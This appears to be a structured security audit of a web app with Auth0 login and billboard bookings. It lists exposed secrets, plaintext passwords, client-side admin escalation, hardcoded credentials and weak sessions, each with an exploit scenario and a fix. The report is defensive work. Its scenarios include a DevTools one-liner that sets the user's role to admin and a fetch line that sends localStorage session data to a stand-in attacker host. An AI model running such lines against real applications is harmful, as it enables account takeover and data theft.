findings.title: Real Auth0 credentials in .env with no .gitignore
findings.description: Real Auth0 CLIENT_SECRET, AUTH0_SECRET, and JWT_SECRET are present in .env. No .gitignore exists, so these will be committed to git verbatim.
findings.exploit_scenario: 1. Developer runs `git init && git add . && git commit`. 2. .env is committed with live Auth0 secrets. 3. Repo pushed to GitHub. 4. Attacker clones/forks repo or GitHub search indexes it. 5. Attacker uses AUTH0_CLIENT_SECRET to impersonate the application, forge tokens, or call the Auth0 Management API to enumerate/modify users.
findings.impact: Full Auth0 tenant compromise. Attacker can impersonate the app, issue tokens for any user, and access/modify user database.
findings.recommendation: 1. Immediately add .gitignore with `/.env`. 2. Rotate AUTH0_CLIENT_SECRET and AUTH0_SECRET in the Auth0 dashboard NOW (treat as compromised). 3. Regenerate JWT_SECRET. 4. Use .env.example for documentation only.

findings.title: Passwords stored in plaintext in localStorage
findings.description: User registration stores the password field verbatim in localStorage under 'vantage_users'. Password comparison in AppContext.tsx:204 is plaintext string equality.
findings.exploit_scenario: 1. Attacker finds XSS vector (or has physical access to machine). 2. Executes `localStorage.getItem('vantage_users')`. 3. Gets JSON array with every registered user's email and plaintext password. 4. Uses those credentials to log in as any user, including admin.
findings.impact: Full credential harvest for all registered users. Passwords are likely reused on other services — breach multiplier.
findings.recommendation: Hash passwords with bcrypt (cost factor 12) before storing. Compare with bcrypt.compare(). Since this is a client-side SPA, the real fix is to move auth to the server — localStorage auth has no path to being secure.

findings.title: Client-side role assignment — any user can self-escalate to admin
findings.description: Register.tsx lets users self-select any role including 'admin'. Role is stored in localStorage. AdminPage.tsx:45 guards only check `currentUser.role !== 'admin'` — a purely client-side check. Anyone can open browser devtools and set `localStorage.setItem('vantage_current_user', JSON.stringify({...JSON.parse(localStorage.getItem('vantage_current_user')), role: 'admin'}))` to gain admin.
findings.exploit_scenario: 1. User registers with any email. 2. Opens DevTools console. 3. Runs: `let u = JSON.parse(localStorage.getItem('vantage_current_user')); u.role='admin'; localStorage.setItem('vantage_current_user', JSON.stringify(u)); location.reload()`. 4. Full admin dashboard access — bookings, billing data, all user operations.
findings.impact: Complete privilege escalation. Every user can become admin with a one-liner in DevTools.
findings.recommendation: Role assignment and enforcement must happen server-side. JWT claims from a server-signed token should carry the role. Client-side role checks are UI hints only — never security gates.

findings.phase_name: OWASP A07 — Identification and Authentication Failures
findings.title: Hardcoded admin credentials ship in production bundle
findings.description: SignIn.tsx hardcodes: `admin@vantagepoint.com` / `password` → admin role, `demo@vantage.africa` / `password` → role from dropdown (including admin). These strings are compiled into the production JS bundle and visible to anyone who opens DevTools > Sources.
findings.exploit_scenario: 1. Attacker opens the deployed app. 2. DevTools > Sources > search 'password'. 3. Finds hardcoded credential block. 4. Logs in as `admin@vantagepoint.com` / `password`. 5. Full admin access.
findings.impact: Immediate admin access for any attacker who opens DevTools. Zero effort required.
findings.recommendation: Remove all hardcoded credentials. Demo flows should use clearly-labeled demo accounts managed server-side or a separate demo environment. Never use 'password' as a credential in any environment.

findings.title: No .gitignore file — entire .env will be committed to git
findings.description: The project has no .gitignore. The .env file contains real credentials. Running `git init && git add .` will stage .env, package-lock.json (315KB), and all local config.
findings.exploit_scenario: Developer commits and pushes the repo. All secrets in .env become part of public git history. Even if .env is deleted later, the secrets remain in git history and are trivially recoverable.
findings.impact: Permanent credential exposure in git history. Requires secret rotation AND git history scrub (filter-repo/BFG) to remediate.

findings.title: Bookings can be created without authentication
findings.description: BookingDrawer.tsx has no check for `currentUser` before allowing form submission. `onConfirmBooking` is called after a 2.2s timeout regardless of auth state. Any anonymous visitor can submit bookings.
findings.exploit_scenario: 1. Attacker opens /booking without logging in. 2. Selects a billboard and fills the booking form. 3. Submits — booking is created and persisted to localStorage as 'Pending Approved'. 4. Admin dashboard shows the forged booking alongside real ones.
findings.impact: Booking system pollution with unauthenticated entries. Operational confusion for admins reviewing pending bookings.
findings.recommendation: Add `if (!currentUser) { setAuthMode('signin'); return; }` at the top of `handleInitiatePayout` and in the component render guard.

findings.title: Session token in localStorage instead of httpOnly cookie
findings.description: User session (`vantage_current_user`) is stored in localStorage. localStorage is accessible to any JavaScript on the page — XSS would allow complete session theft. httpOnly cookies are immune to XSS-based theft.
findings.exploit_scenario: 1. XSS vulnerability anywhere on the page. 2. Attacker injects `fetch('https://attacker.com/steal?s='+btoa(localStorage.getItem('vantage_current_user')))`. 3. Receives full user object including email and role.
findings.impact: Session hijacking via XSS. React's default XSS escaping reduces XSS risk but doesn't eliminate it (dangerouslySetInnerHTML, user-controlled hrefs, DOM-based XSS).
findings.recommendation: Use httpOnly, Secure, SameSite=Strict cookies for session tokens. Remove localStorage session persistence.

findings.phase_name: OWASP A07 — Identification and Authentication Failures
findings.title: Minimum password length of 6 characters — no complexity requirement
findings.description: `validatePassword` allows passwords as short as 6 characters with no complexity requirement. 'aaaaaa', '123456', 'password' all pass.
findings.exploit_scenario: User registers with password '123456'. Credential stuffing attack with common passwords succeeds immediately.
findings.impact: Account takeover via credential stuffing or brute force.
findings.recommendation: Minimum 8 characters, require at least one uppercase + one number OR use a strength meter (zxcvbn). Consider integrating haveibeenpwned.com API to reject breached passwords.

findings.title: Environment mode leaked to UI
findings.description: `import.meta.env.MODE` is rendered directly in the UI. In production this shows 'production'; in staging/dev it shows those values — information useful for fingerprinting the deployment environment.
findings.exploit_scenario: Attacker sees 'development' or 'staging' in the UI, knows the environment is less hardened, and tailors their attack accordingly.
findings.impact: Minor information disclosure. Lowers attacker effort for environment-specific attacks.

tools_skipped: npm audit — run manually for full CVE scan
